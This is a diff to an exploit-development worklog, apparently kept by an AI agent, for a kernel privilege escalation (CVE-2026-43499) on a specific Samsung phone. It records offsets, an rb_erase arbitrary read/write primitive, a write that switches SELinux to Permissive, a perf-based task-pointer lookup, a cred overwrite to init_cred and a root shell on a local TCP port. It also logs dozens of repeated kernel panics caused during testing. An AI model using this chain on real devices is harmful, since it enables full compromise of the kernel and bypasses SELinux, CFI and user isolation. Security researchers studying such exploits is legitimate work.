@@ -2128,35 +2128,632 @@ clean leaf only on a reclaim hit. On a leftover `mm_struct` page that
 offset is mid-object pointers, so the first fire panics. Burst + 250 ms
 timeout did raise walk probability (fire on attempt 2).
 
-**Next resume (not done this stop).** Point probe `Q` at `fake_fops`
-(`page+0x1000`, already a leaf: `llseek`/`read` = 0). Store
-`FOPS_RECLAIM_PROBE_MAGIC` in `owner`. Leftover mm page-0 is usually
-zeros → walk survives, `boot_id != MAGIC`, skip `misc->fops`. Hit →
-MAGIC → second walk writes `misc->fops` → owner-clear. Do not launch
-`DIRECT_FOPS_PROBE` again until that change is in the `.so`.
+**Resume 2026-08-17 09:48.** Probe `Q` is now `fake_fops` (`page+0x1000`).
+`FOPS_RECLAIM_PROBE_MAGIC` is stored in `owner`; `llseek`/`read` stay 0 so
+leftover mm page-0 is still a leaf. Device `R5CX11J755L` up 8h30m, load
+~5.7, still `uid=2000`. Rebuilt `cve-2026-43499-app.so`, launching
+`DIRECT_FOPS_PROBE=1` with `SLIDE_PSELECT_TIMEOUT_MS=250` and
+`SLIDE_CONSUMER_BURST=4`. Do not use the pre-fix `.so`.
 
-**Root status 2026-08-17 01:20 (stopping here).**
+**Root status 2026-08-17 09:48.**
 
 - Device: `R5CX11J755L` / `e3qzcx` / `S9280ZCS6DZF2`, ADB up, `uid=2000`.
-- KASLR leak: done (tracefs). Last slide before RWC 92: `0xf0000`.
+- KASLR leak: done (tracefs). Fresh slide pending this launch.
 - Child-mode arb-read of `rb_left(Q)=0` targets: previously proven.
 - `rb_erase` write of `misc->fops`: fire-proven.
 - `fops_get` / ashmem `open`: proven after owner-clear.
 - `ASHMEM_SET_NAME` ENOTTY: table reclaim miss.
-- `DIRECT_FOPS_PROBE` as committed: **unsafe** (RWC 92). Fix above
-  before the next device run.
+- `DIRECT_FOPS_PROBE` Q=`fake_fops` + MAGIC-in-owner: in `.so`, first
+  post-RWC92 device run starting.
 - KernelSU late-load: not reached.
 
-**Page layout in this tree (unsafe probe Q still at `0x1400`).**
+**Page layout now.**
 
 | Offset | Role |
 | --- | --- |
-| `0x1000` | fake `file_operations` |
+| `0x1000` | fake `file_operations`, `owner=MAGIC`, probe Q |
 | `0x1180` / `0x11c0` | probe lock + waiter |
 | `0x1280` / `0x12c0` | FOPS-write lock + waiter |
-| `0x1400` | leaf `FOPS_RECLAIM_PROBE_MAGIC=0x43499001` (do not use as Q) |
+
+**4-attempt batches (user request).** `EXPLOIT_ATTEMPTS=4`. First
+owner-MAGIC probe batch on slide `0x110000`: attempts 1–3 `pselect ret=0`,
+attempt 4 panicked before flush.
+
+| Field | Value |
+| --- | --- |
+| Time | 2026-08-17 09:54:48 +0800 |
+| RWC | 93 |
+| PC | `rt_mutex_adjust_prio_chain+0x1ec/0x91c` |
+| LR | `rt_mutex_adjust_prio_chain+0x130/0x91c` |
+
+Not the RWC 92 two-child path.
+
+**Panic-rate stop (2026-08-17 10:00).** Three KPs in six minutes of
+fresh-boot FOPS walks. User called this out; they are right.
+
+| RWC | Time | PC | Boot age |
+| --- | --- | --- | --- |
+| 93 | 09:54 | `rt_mutex_adjust_prio_chain+0x1ec` | ~0 min, after 1700 load storm |
+| 94 | 09:57 | `rt_mutex_adjust_prio_chain+0x1ec` | 0 min, BURST=4 |
+| 95 | 10:00 | `_raw_spin_trylock+0x1c` | 0 min, BURST off, still young |
+
+Cause: lock at `page+0x1180` is in mm page-0. Leftover often looks
+unlocked, so the walk runs on a live `rt_mutex` / waiter and dies.
+The only FOPS progress this session (hijack + open + ENOTTY) was on a
+settled boot with `BURST` off. Aug 1 CHILD/`0x5200` 1-object lock had
+fires with zero panics because a miss did not look unlocked.
+
+Rules until uid 0:
+
+1. No walk at uptime < 4 min.
+2. No `SLIDE_CONSUMER_BURST`.
+3. No `DIRECT_FOPS_PROBE` until Q is proven leaf-on-miss *and* the
+   boot is settled.
+4. 4 attempts per batch (speed), `DIRECT_FOPS_WRITE` only.
+5. Kill leftover `id` trees; never overlap batches.
+
+Next: wait this boot out, then one 4-shot `DIRECT_FOPS_WRITE`.
+
+**Settled FOPS 4-shots 10:04–10:11 (slide `0x60000`, BURST off).**
+12 misses, zero panics, then attempt 16 (batch 4 attempt 4) → RWC 96
+`Oops - BUG PC:rt_mutex_adjust_prio_chain+0x918` leftover waiter.
+FOPS lock at `page+0x1280` still walks leftover mm and eventually
+BUG_ONs. Panic rate is still too high for this path.
+
+**Switch: Aug 1 CHILD / 0x5200 lock.** That 1-object lock fired with
+zero panics (miss = `ret=0`, not a leftover walk). Next 4-shot after
+uptime ≥ 4 min:
+`DIRECT_BOOTID_RECLAIM=1 DIRECT_BOOTID_CHILD=1
+DIRECT_BOOTID_ADDR=0xffffff80022cf8c0` (P0 `INIT_TASK`). No FOPS, no
+PROBE, no BURST. Goal: `read_ok=1` on `boot_id`, then cred write.
+
+### Hardware session 2026-08-17 10:20 — kimage CHILD, still uid 2000
+
+Device came back after RWC 96. Fresh slide via `run-slide.sh`:
+`base=ffffffc008140000 slide=0x140000`. Uptime 10–17 min, load ~2.
+
+**Code (this session).** `select_slide_payload_index` no longer adds
+`slide_p0_offset` onto P0 aliases. Walk VAs go through
+`text_addr`/`data_addr`/`resolve_kernel_va`. `DIRECT_BOOTID_RECLAIM`
+prepares `PAGE_PAYLOAD_SLIDE` (lock at `mm_base+0x4200` = payload
+`0x5200`) instead of FOPS leftover page-0. Fire path logs boot_id.
+
+`run-app.sh` on device was the 10:04–10:11 FOPS regression: stale
+`SLIDE_P0_OFFSET=0x60000` plus `DIRECT_FOPS_WRITE=1`. That is why
+app15–18 printed `lock=page+0x280` (`FOPS_WRITE_LOCK_OFF 0x1280` on
+`payload_base = mm_base-0x1000`).
+
+**vmlinux static bytes (unslid).**
+`init_task` `q0=8 q1=0 q2=1 q3=ffffffc00a24dbc0` — not a static leaf.
+Runtime 8/1 fires still used it because live `thread_info` is often
+small. `init_task.cred` @ `+0x838` (BTF) holds `init_cred`
+(`0xffffffc0097af018`). Added `TASK_CRED_OFF`/`TASK_REAL_CRED_OFF`/
+`INIT_CRED_OFF`/`PER_CPU_OFFSET_OFF` to `target.h`.
+
+**app19 (4 shots, `DIRECT_BOOTID_ADDR=0xffffffc00a24f8c0`).** Geometry
+bug: `resolve_kernel_va` treated the unslid kimage VA as already-slid
+because `0xffffffc00a24f8c0` sits inside `kaslr_base+64MiB`.
+`task=ffffffc00a38f8c0` (correct) but `child=ffffffc00a24f8c0` (unslid).
+parent/target were correct kimage boot_id (`…a4b62e0`/`…a4b62f0`).
+lock=`…4200`. 4/4 `pselect ret=0`, device stayed up.
+
+**app20 (12 shots, no ADDR, default Q=`text_addr(INIT_TASK)`).**
+`child=task=ffffffc00a38f8c0` correct. Attempts 1–9 miss (`ret=0`).
+Attempt 10 armed (`consumer sched idx=0`) then adb dropped. USB still
+shows `VID_04E8 PID_6860` ADB interface; adbd not enumerating yet.
+Pull `prev_dump.log` + `power_off_reset_reason.txt` first after
+reconnect. Do not reuse P0 `DIRECT_BOOTID_ADDR`.
+
+**app21 (slide `0xc0000`, kimage CHILD, lock `mm+0x4200`).** 6/12 fires,
+device stayed up. Attempts 1–3: `read_ok=1 value=f94d5b1bf7af8f13`
+stable. Geometry:
+`parent=ffffffc00a4362e0 target=ffffffc00a4362f0`
+`child=task=ffffffc00a30f8c0` (`init_task` slid). **kimage CHILD
+arbitrary-read is proven.** Later fires `read_ok=0` after `boot_id`
+ctl_table was smashed (`/proc/sys/kernel/random/boot_id` vanished;
+garbage dent `\x82bC` left in `random/`). CFI still ran and failed
+(`misc_fops` step 4) — now skipped under `DIRECT_BOOTID_RECLAIM`.
+
+**RWC 97** (app20 attempt 10): `_raw_spin_trylock+0x1c` /
+`rt_mutex_adjust_prio_chain+0x130` — fire + reclaim miss (`lock=0`).
+
+**app22/23** switched oracle to `random/uuid` (`data=NULL`) so `boot_id`
+stays intact. app23 attempt 1 fired (`write ok=1`) but `uuid` read
+returned 0 (open/parse fail) — likely `parent=data-0x10` also
+touches the `ctl_table` name. RWC 98 same trylock-miss. Next: keep
+the proven `boot_id` oracle for one read, then `DIRECT_ERASE_WRITE`
+for cred; log both UUID qwords.
+
+### Kernel RE 2026-08-17 (vmlinux.elf)
+
+`current` is `mrs SP_EL0` (`bpf_get_current_task`). No `current_task`
+percpu. `__entry_task` sits next to `overflow_stack` — exception
+scratch, **not** safe as Q (app24 RWC: first shot panics).
+
+`commit_creds`: `real_cred` at `task+0x830`, `cred` at `+0x838`
+(matches BTF). Then `kdp_get_usecount` / `kdp_set_cred_non_rcu`.
+`kdp_enable` first byte is **0** in the image (`ldrb` + `cbz` skips
+the RO-cred path). `init_cred` @ `0xffffffc0097af018`: usage=4, uids=0,
+caps=`0x1ffffffffff`.
+
+`mm_struct.owner` @ `0x338`, `ioctx_table` @ `0x330` (BTF).
+
+**`rb_erase` (0xffffffc0090fa95c) one-right-empty path +0x84:**
+`str parent_color, [rb_left]` then dest is `parent+0x10` only if
+`parent->rb_left == waiter`, else `parent+8`. The waiter is on the
+*stack*; `parent->rb_left` will not equal it. Dest is therefore
+**parent+8**. `parent = &ctl_table.data - 8` writes Q into `.data`.
+The old `parent = data-0x10` writes Q into `.procname` — that is why
+`boot_id` vanished (`\x82bC` dent) while the UUID stayed put.
+
+**app21 “arb-read” was a false positive.**
+`f94d5b1bf7af8f13` is the live `boot_id` UUID of that boot
+(`138faff7-1b5b-4df9-…`), not `init_task`. Leafless
+`404ef8c8…` was `proc_do_uuid(NULL)`. Walk/fire is real; the erase
+did not retarget `.data`.
+
+**app25/26** use `parent=data-8`, `Q=mm+0x330`. 8+8 attempts, one
+fire (app26 att1): `lo=cf47fcb98eafa46f hi=0957cacc166230be` — not
+parent and not a task pointer. `boot_id` file still exists
+(`d760d64b-5172-4737-…`). Erase destination still not proven.
+`DIRECT_CRED_CHAIN` waits for `hi` in `0xffffff…`.
+
+**app28 att1 — ARBITRARY READ PROVEN.**
+Q = `init_task+0x828` (`ptracer_cred`). Fire:
+`lo=ffffffc00a5162e8` (== parent)
+`hi=ffffffc00994f018` (== `init_cred` + slide `0x1a0000`).
+`parent=data-8` plants Q into `boot_id` `.data`; `Q+0` is overwritten
+with parent; `Q+8` is the wanted qword. `current` is `SP_EL0`.
+`task.cred`/`real_cred` = `+0x838`/`+0x830`. Next: walk
+`init_task.tasks` (`+0x550`) to our pid (`+0x630`) and
+`DIRECT_ERASE_WRITE` `task->cred` to the page root-cred image.
+
+**app30 att4** repeated the proof on slide `0x20000`:
+`hi=ffffffc0097cf018` = `init_cred+0x20000`. Walk then started and
+panicked on `Q=init_task+0x548` (last qword of `sched_info`). Do not
+smash `tasks-8`.
+
+**app31** (slide `0x0`, pid-first walk, no list smash): 0/8 fires.
+Device stayed up. Fire rate is still ~1/8.
+
+### Kernel RE — settled map (2026-08-17)
+
+`current` is `mrs SP_EL0`. There is no user-reachable `current_task`.
+`__entry_task` is per-cpu exception scratch next to `overflow_stack`
+(app24 first shot panics). `kdp_enable` / `init_cred_kdp` are 0.
+
+| Field / symbol | Offset / unsild VA | Notes |
+| --- | --- | --- |
+| `init_task` | `0xffffff80022cf8c0` | p0 profile + nm |
+| `init_cred` | `0xffffff80017af018` | usage=4, uids=0 |
+| `init_pid_ns` | `0xffffffc00a261c70` | `idr` at +0, `child_reaper` at +0x30 |
+| `init_struct_pid` | `0xffffffc00a261cf0` | `tasks[]` at +0x10 |
+| `task.tasks` | +0x550 | list_head |
+| `task.pid` | +0x630 | smash `restart_block` tail at +0x628 to read |
+| `task.real_parent` | +0x640 | BTF 12800 |
+| `task.parent` | +0x648 | |
+| `task.children` | +0x650 | list_head |
+| `task.sibling` | +0x660 | |
+| `task.ptracer_cred` | +0x828 | safe smash slot (app28/30) |
+| `task.real_cred` / `cred` | +0x830 / +0x838 | |
+| `task.comm` | +0x848 | |
+| `mm.ioctx_table` / `owner` | +0x330 / +0x338 | |
+
+**Arbitrary read/write primitive (proven).**
+`rb_erase` one-right-empty: dest = `parent+8`. Set `parent = data-8`
+so dest is `ctl_table.data`. Plant Q there. `boot_id` then returns
+16 bytes at Q: `lo` is smashed with parent, `hi` is the wanted qword.
+Write: `DIRECT_ERASE_WRITE` plants V at B=`DIRECT_BOOTID_ADDR`.
+
+**Why uid is still 2000.**
+We do not have *our* `task_struct*`.
+
+1. `mm->owner` of the *dead* leak child is NULL (`mm_update_next_owner`
+   on exit). `clone_leak_child` calls `exit(0)` after collisions.
+   Pinning the mm with `/proc/pid/mem` keeps the page, not the owner.
+2. `init_task.tasks-8` smashes `sched_info` (app30 panic).
+3. `__entry_task` is on the exception stack (app24 panic).
+4. Full task-list walk needs one successful fire per node (~1/8).
+
+**Next path: `DIRECT_HOLD_MM`.**
+New `clone_hold_child`: after `kernelsnitch_find_collisions`, `pause()`
+instead of `exit`. Two `prepare_kernel_page` calls in one process:
+
+1. Hold: leak live mm VA, keep child + memfd, do not reclaim that page.
+2. Lock: normal 1-object reclaim for `fake_lock`.
+
+Then 2–3 fires:
+
+1. Q = `hold_mm+0x330` → `hi` = live `mm->owner` (hold child task)
+2. Q = `owner+0x638` → `hi` = `real_parent` (us)
+3. `DIRECT_ERASE_WRITE` `task->cred` / `real_cred` = `init_cred`
+
+Backup: `init_pid_ns.idr.xa_head` at `init_pid_ns+8` and walk the
+xarray to our pid. More fires than hold-mm.
+
+**app32** `clone_hold_child` raced: parent called
+`kernelsnitch_found_collisions` while child still at `KERNELSNITCH_INIT`.
+4/4 hold leaks failed. Device stayed up.
+
+**app33 att2** after waiting on `ks->state`: hold leak worked
+(`mm=ffffff88b5070000` child=29265 still alive). Lock page separate
+(`ffffff8a13f63800`). First fire `write ok=1` but `lo/hi` were the live
+`boot_id` UUID — erase did not retarget `.data`. Retry fire then
+panicked (typical reclaim-miss trylock). Collision wait raised to 20 s.
+Next boot: new slide, same hold-mm chain.
+
+**app34** slide `0x1f0000`. Hold leak 6/6 (live child + separate lock
+page). First fire missed every attempt; hold-chain was gated on `ok`
+so it never retried. Device stayed up.
+
+**app35** moved owner-read retries outside the first-fire `ok` gate.
+Att1/2: 16+16 misses, `hold-owner got=0`, device stayed up. Att3
+panicked on retry fire (reclaim-miss trylock). Hold-mm VA is solid;
+the remaining gate is a successful erase into `boot_id.data` while the
+hold child is still paused.
+
+**app36** slide `0xd0000`. Hold leak 3/3. Att1/2: 16+16 misses.
+Att3 dropped adb mid-retry. Reset reason this boot was
+`userrequested`/`RP`, not a new RWC line — may have been a hang
+rather than a logged KP. Fire rate in hold-mm batches is worse than
+the earlier `Q=init_task+0x828` 1/8. `Q=mm+0x330` has
+`Q+8=owner != 0`; that is required for the read and matches the
+proven `ptracer_cred`/`real_cred` pair (`Q+8=init_cred`). Keep
+shooting.
+
+### Session status 2026-08-17 ~12:20 — still uid 2000
+
+**Proven**
+- Arbitrary read via `boot_id`: `parent=data-8`, plant Q, `hi=Q+8`.
+  app28 `hi=init_cred+0x1a0000`; app30 `hi=init_cred+0x20000`.
+- KDP off. `current` = `SP_EL0`. `__entry_task` is exception-stack
+  (app24 panic). Smash `sched_info` (`tasks-8`) panics (app30).
+- Dead leak-child `mm->owner` is NULL (`mm_update_next_owner`).
+
+**Implemented (`DIRECT_HOLD_MM`)**
+- `clone_hold_child`: collisions then `pause()` (does not `exit`).
+- Parent waits up to 20 s for `ks->state` in
+  `{COLLISIONS_FOUND, COLLISIONS_NOT_FOUND}`.
+- Two `prepare_kernel_page`s: hold mm (no reclaim) + lock page.
+- After fire: Q=`hold_mm+0x330` → owner; Q=`owner+0x638` →
+  `real_parent`; write `cred`/`real_cred` = `init_cred`.
+- Files: `src/util.c`, `src/slide_app.c`, `src/common.h`,
+  `src/targets/e3q-S9280ZCS6DZF2/target.h`
+  (`TASK_REAL_PARENT_OFF=0x640` etc.).
+
+**Device**
+| Run | Slide | Hold leak | Erase into `.data` | uid | Notes |
+| --- | --- | --- | --- | --- | --- |
+| app28 | `0x1a0000` | n/a | yes (`init_cred`) | 2000 | arb-read proven |
+| app30 | `0x20000` | n/a | yes | 2000 | walk smash `+0x548` panic |
+| app31 | `0x0` | n/a | 0/8 | 2000 | pid-first, no list |
+| app32 | `0x0` | 0/4 race | — | 2000 | child still INIT |
+| app33 | `0x0` | 1/2 | fire but UUID | 2000 | retry panic |
+| app34 | `0x1f0000` | 6/6 | 0 (no retry) | 2000 | chain gated on first `ok` |
+| app35 | `0x1f0000` | 2+ | 0/32+ | 2000 | att3 retry drop |
+| app36 | `0xd0000` | 3/3 | 0/32+ | 2000 | att3 adb drop; RP not KP |
+
+**app37** slide `0xa0000`. Heavy dual-prepare. Att1 12+ misses then
+adb drop.
+
+**app38** retry cap 3. Att1 4 misses (survived). Att2 hold+lock then
+drop during first fire.
+
+**app39** light hold leak (no 32-slab spray). `hold light mm` +
+`memfd=3`. Att1/2 completed 4+4 misses, device stayed up. Att3 dropped
+after lock prepare. Light hold is the keeper; fire rate still ~0.
+
+**app40** slide `0x1a0000`. First fire `write ok=1`. Did **not** read
+`boot_id`; immediately started a second pselect and dropped. Code now
+reads the first-fire oracle before any retry, and writes the **hold
+child** `cred` (skip `real_parent` walk). Hold child polls `getuid`
+and writes `/data/local/tmp/hold-root` on uid 0.
+
+**app41** slide `0x0`. Light hold ok; dropped during lock prepare
+before a fire.
+
+**app42** slide `0x160000`. Att1/2 4+4 misses. Att3 drop after lock.
+
+**app43** one fire/attempt. 6/8 attempts survived, **0/6 fires**,
+drop on att7 lock prepare. Device stayed up 154s. Hold leak still
+6/6. Next: control batch **without** `DIRECT_HOLD_MM`,
+`Q=init_task+0x828`, to see if the live hold child is killing the
+fire rate.
+
+**app44 control** (no hold-mm, `Q=init_task+0x828` slid
+`0xffffffc00a2900e8`, slide `0x40000`): 7/8 attempts survived, **0/7
+fires**, drop on att8. Fire window is cold even on the proven Q.
+`pselect` always `ret=0 sched_ok=1`; `write status=256`. Hold-mm is
+not uniquely to blame. Keep shooting; first hit must read `boot_id`
+before a second fire (app40 lesson).
+
+### Direction check 2026-08-17 14:05
+
+Hold-mm / cred-chain grinding since arb-read (app28, ~11:30) through
+app44 (~14:00): **~2.5 h, still uid 2000**. The primitive is not the
+blocker. `sched_setattr` walk fire is: 0/6 (app43 hold) and 0/7
+(app44 proven `Q=init_task+0x828`). Same `pselect ret=0 sched_ok=1
+write status=256` as the July 31 note.
+
+Public GhostLock (OnePlus, same CVE) does **not** walk `init_task.tasks`
+or smash `mm->owner` of a dead leak child. ADB-shell path:
+`perf_find_task()` on a live child, then one PI write
+`child->cred = init_cred`. Write-1 is `selinux_enforcing = 0` (no
+task pointer needed).
+
+**Stop** 8-shot hold-mm loops. Next useful work, in order:
+
+1. Raise walk-fire rate: `SLIDE_CONSUMER_BURST=3` (this doc, July 31).
+2. After one clean `write ok=1`, read `boot_id` **before** any second
+   fire (app40).
+3. Port `perf_find_task` for the hold/pselect child instead of
+   `mm->owner` / task-list walk.
+4. Optional first write: `SELINUX_ENFORCING` (known VA, no task).
+
+**app45 `BURST=3`** slide `0x190000`. Att1 miss. Att2 **fired**
+(`write ok=1`, `calls=2`). `boot_id` was read (good). `lo/hi` were
+not parent/`init_cred` because `DIRECT_BOOTID_ADDR` was already slid
+(`0xffffffc00a3e00e8`); `resolve_kernel_va` added slide again →
+`child=0xffffffc00a5700e8`. Pass **unslid** `init_task+0x828`
+(`0xffffffc00a2500e8`). Att3 then dropped. BURST=3 is the fire-rate
+fix.
+
+**app46** unsild `Q=init_task+0x828`, `BURST=3`, no hold: **2/4 fires**,
+0 panics. Geometry locked:
+`lo==parent`, `hi=init_cred+0xa0000` (`ffffffc00984f018`).
+
+**app47** same boot + in-process `DIRECT_HOLD_MM`: **0/6 fires**.
+Second `prepare_kernel_page` / live hold child kills the window.
+
+**HOLD_LEAK_ONLY** (later): light leak + pause works
+(`mm=ffffff88d78d7800`) but supervisor SIGKILL at timeout; never
+paired with a fire process.
+
+`perf_event_paranoid=-1` on device. PMU nodes present. GhostLock's
+`perf_find_task` is viable from adb shell.
+
+**Split-process (app48–50), slide `0x60000`.**
+A: orphan hold child (no PDEATHSIG, 3 fds). `hold-mm.txt` works.
+B app48/49: inherited pipe fds → `F_SETPIPE_SZ` EPERM.
+B app50 (3 fds): env mm used, Q=`mm+0x330`, **one** lock prepare,
+**0/6 fires**, device stayed up, child still alive. Live extra mm
+still looks hostile to the window. Next: `perf_find_task`.
+
+**app51 — kernel write proven. SELinux is Permissive.**
+`BURST=3` `DIRECT_ERASE_WRITE` `ADDR=selinux_enforcing` (unslid
+`0xffffffc00a521588`). Att1 `write ok=1` while `enforce=1`. Att2
+startup already `enforce=0`. After the batch:
+`/sys/fs/selinux/enforce=0`, `getenforce=Permissive`. uid still 2000.
+GhostLock write-1 is done. GhostLock `find_task_by_tgid` uses
+**pipe_read64**, not perf. Next: IDR/`perf`/pipe-physrw for a task
+pointer, then `cred=init_cred`.
+
+**app52** tried `Q=init_pid_ns` to read `xa_head`. Att1 miss. Att2
+dropped adb — do **not** smash `init_pid_ns` lock. SELinux write
+(app51) remains the last proven useful write.
+
+**app53** `DIRECT_TASK_NEWEST`: Q=`init_task+0x550` (smash `tasks.next`,
+read `prev` = newest if `list_add_tail`). 0/6 fires, device up. Q
+geometry logged `child=...a2efe10` = slid init+0x550.
+
+**app54** same boot, selinux write control: 0/4 fires, still Enforcing.
+This boot's window is cold (0/10). Newest-task path is coded; needs a
+hot boot like app46/51.
+
+**app55** newest-task att1 dropped adb during pselect — likely the
+first actual fire of `Q=init+0x550` corrupted `init.tasks.next`.
+**Do not smash `init_task.tasks`.** Newest-task path is retired.
+
+**app56** `DIRECT_HOLD_AFTER`: lock prepare OK, then light hold
+`SYSCHK(kill)` ESRCH abort. `kill_child` now ignores ESRCH/ECHILD.
+
+**app57** hold-after works: lock page then `hold light mm`, Q=`mm+0x330`.
+Att1–3 miss. Att4 dropped during pselect. Plumbing is right; window
+still hates a live extra mm. uid 2000.
+
+**app58** slide `0x130000` selinux write, `BURST=3`: 0/6 fires, still
+Enforcing, device stayed up (uptime 23 min). Window cold. Cred write
+is waiting on a fire + a task pointer (hold-after or pipe physrw).
+
+**app59** new boot slide `0x130000` HOLD_AFTER 8 planned. Att1–4
+lock+leak+Q=`mm+0x330` all miss. Att5 dropped in pselect. Same
+pattern as app57. uid 2000.
+
+### Direction 2026-08-17 15:30 — stop spending fires on task*
+
+Evidence, not preference:
+
+1. **Primitive is done.** Read (app46 `hi=init_cred+slide`) and write
+   (app51 SELinux → Permissive) both work. `BURST=3` + no extra mm
+   is the only hot setup (2/4). Cold boots go 0/6–0/10.
+2. **Hold-mm is a fire killer.** Same boot: app46 2/4 vs app47 0/6
+   with in-process hold. Split B (app50) 0/6. HOLD_AFTER (app57/59)
+   0 fire then pselect drop. One live extra mm is enough.
+3. **List smash is a panic.** `init.tasks` (app55), `init_pid_ns`
+   (app52). GhostLock does **not** PI-walk the task list.
+4. **GhostLock `find_task_by_tgid` is `pipe_read64`**, after pipe
+   physrw. Unlimited reads. Our boot_id oracle is 16 bytes per fire.
+   Walking tasks with PI fires cannot win at 1/4 hit rate.
+5. **CFI/pipe path is the designed unlimited R/W** (`try_cfi_stage`
+   → `install_pipe_physrw` → `install_android_root`). We gated it
+   off with `DIRECT_BOOTID_RECLAIM` to debug the oracle. SELinux
+   off does not disable CFI; we still need a planted `fake_fops`
+   (FOPS reclaim, no hold-mm).
+
+**Do next (one track):** FOPS-only, `BURST=3`, no hold, no task
+smash. Goal: `cfi misc_fops` matches `fake_fops`, then pipe physrw,
+then `find_task_by_tgid` + `cred=init_cred`. Optional side: retarget
+a *writable* sysctl `.data` (not `boot_id`) for reusable write.
+
+**Do not:** more HOLD_AFTER 8-shots, newest-task, IDR smash, or
+cred-chain until a fire happens *without* an extra mm.
+
+**app60** FOPS-only `BURST=3`, no hold, slide `0xe0000`. mode=0
+prepare OK. Att1–2 miss (`triggered=0`). Att3 dropped in pselect.
+Never reached `try_cfi_stage`. FOPS lock still walks leftovers on
+fire. Next: plant `fake_fops` into `ashmem_misc.fops` using the
+**SLIDE 0x5200 lock** (safe miss), then call `try_cfi_stage`.
+
+**app61** `DIRECT_FOPS_PLANT` + SLIDE lock: `WRITE_VALUE=0` because
+`fake_fops` was unset. 0/6 fires, device up.
+
+**app62** `fake_fops=page+0x1000` (payload `FOPS_TABLE_OFF`). Dest
+`ashmem_misc.fops-8` correct. 0/6 fires, no panic, no CFI. Window
+cold. Plant path is ready for a hot boot.
+
+**app63** heat check `Q=init+0x828` same boot: 0/2. Still cold.
+Do not grind this boot.
+
+### Session 2026-08-17 16:55–19:10 — DIRECT_CRED_SELF + 250 ms window
+
+Device recovered via `fix-adb.ps1` (kill adb processes) after a USB
+drop.  Boot A slide `0x1d0000` (tracefs), uptime 1h27m, load ~3.
+
+**app64** (`DIRECT_FOPS_PLANT`, BURST=3, slide `0x1d0000`): attempt 1
+FIRED (`write ok=1`, burst `calls=2`), ashmem open `ENODEV` →
+`fops-plant cfi=0 step=11` — foreign page at `fake_fops` (reclaim
+miss).  Attempts 2–4 miss.  Device up.
+
+**app65**: attempt 2 FIRED (`ok=1`), open `EACCES` ×2; attempt 3
+dropped adb.  **RWC 121: `Oops - CFI PC:misc_open+0x11c`, target
+`0xffffff8a04b18c80`, x24=`0xffffff802b261000`** — exactly attempt
+2's planted `fake_fops` value.  First hard proof the plant WRITE
+lands on the real `ashmem_misc.fops`; the table content was foreign
+(reclaim miss), so the next `misc_open` (QuickSettingsTile, an
+innocent system process) CFI-panicked.  Delayed-blast pattern again.
+
+**rb_erase disasm locked** (vmlinux.elf `0xffffffc0090fa95c`):
+one-left-child path `+0x84`: `[child+0] = node->parent_color`
+(collateral; the `rb_erase+0x8c` fault site of KP #75/#78), then
+dest = `parent+0x10` iff `[parent+0x10]==node` else `parent+8`, and
+`[dest] = child`.  With our armed waiter (`tree_left=V`,
+`tree_right=0`, `parent=B-8`): **`[B]=V`, `[V+0]=B-8`**.  B and V must
+both be writable kernel VAs.
+
+**Pivot rationale.**  FOPS root needs a *content-controlled* reclaim
+of the freed mm_struct page (never observed in weeks of runs).  The
+proven primitives (boot_id/uuid arb-read on CHILD fires, one-child
+rb_erase arb-write) need no reclaimed content.  GhostLock's
+`perf_find_task` (self-sampling port) supplies the one missing
+address — our own `task_struct` — without any kernel list walk.
+
+**Implemented `DIRECT_CRED_SELF`** (this session):
+- `src/util.c` `perf_find_task_self()`: per-task SOFTWARE CPU_CLOCK
+  perf event, `PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR` (mask
+  `0xffffffff`), mmap ring, 500k `getpid` spin; votes all sampled
+  kernel regs in `0xffffff80_00000000..0xfffffffe_00000000`; logs top
+  3 candidates.  VMAP stack pointers fall below the range filter, so
+  the winner is a physmap (SLUB) per-process object.
+- `src/slide_app.c` `app_cred_self_route()` (hooked at the top of the
+  active `app_trigger_fops_slide_route`, env `DIRECT_CRED_SELF=1`):
+  fire 1 = `slide_fire_read64(task+0x628)` → `hi` = pid|tgid at
+  `+0x630`, must both equal `getpid()` (validation; skip with
+  `DIRECT_CRED_SELF_NOVALIDATE=1`); fire 2 =
+  `slide_fire_write64(task+TASK_CRED_OFF, text_addr(INIT_CRED))`.
+  Collateral `[init_cred+0]=task+0x830` smashes `init_cred.usage/uid`
+  (uid reads `0xffffff88`) but leaves caps intact
+  (`cap_effective=0x1ffffffffff`), so `setresgid(0,0,0)` +
+  `setresuid(0,0,0)` via CAP_SETUID mints a fresh clean root cred and
+  also repairs `real_cred`.  On `uid==0`: proof file
+  `/data/local/tmp/cred-self-root.txt`, best-effort `enforce=0`
+  (init_cred SID = kernel domain), detached TCP root shell on
+  `127.0.0.1:5559` (`adb forward tcp:5559 tcp:5559`).
+- `src/targets/e3q-S9280ZCS6DZF2/target.h`: `TASK_PID_OFF=0x630`.
+- Route knob: `SLIDE_ENTER_DELAY_PIN=1` keeps a caller-provided
+  `SLIDE_ENTER_DELAY_USEC` instead of cycling the built-in array.
+
+**app66 — perf needs Permissive.**  Every attempt:
+`perf_event_open errno=13` despite `perf_event_paranoid=-1`.  The
+SELinux `perf_event_open` hook denies shell under Enforcing.  So the
+boot-level order is: one selinux write (app51 config) → Permissive →
+cred-self batches.  (app51's leafless-zero mechanics re-verified
+empirically this session: a completed fire with the run-selinux.sh
+config does yield `enforce=0`.)
+
+**Burst-calls=1 root cause + fix.**  Cold-boot logs showed
+`consumer sched idx=0` only (`calls=1`) even with `BURST=3`: idx=0's
+`sched_setattr` blocks in-kernel ~40–190 ms (the unresolved 39–340 ms
+duration), and fix #17's armed gate then kills idx=1+.  With
+`SLIDE_PSELECT_TIMEOUT_MS=250` (armed frame outlives the ~150 ms
+residue death, so retry-loop walks exit quietly instead of
+dead-frame panics) + `SLIDE_ENTER_DELAY_USEC=60000`
+(+PIN) + `BURST=5 SPACING=5000`, **app74 attempt 3: `calls=5
+sched_ok=5 ret=6`, fired, completed cleanly, `enforce=0`, no
+panic.**  Note: `calls=1` windows are no-residue windows — the
+residue is decided at the waiter's 50 ms cleanup, so extra shots only
+help when the residue exists (app74's firing pattern).  Panic-avoidance
+is the 250 ms window's real win.
+
+**app75** (cred-self, Permissive, slide `0x1d0000`): perf scan works —
+winner always a fresh physmap VA (~114/512 votes, 2:1 margin over a
+boot-constant kimage second `0xffffffc00a41dbc0`), exactly the
+task_struct signature.  But 18 read windows produced **0 fires** →
+validation never ran.  Post-batch: **RWC 124 softdog 100 s hang**
+(delayed blast from a silent fire) and **RWC 125 trylock panic**
+(teardown walk) — two reboots, slides `0x1d0000` then `0x1c0000`.
+
+**app78** (selinux, slide `0x1c0000`, 250 ms window): 6 attempts,
+0 fires, still Enforcing, device up.  Grind continues.
+
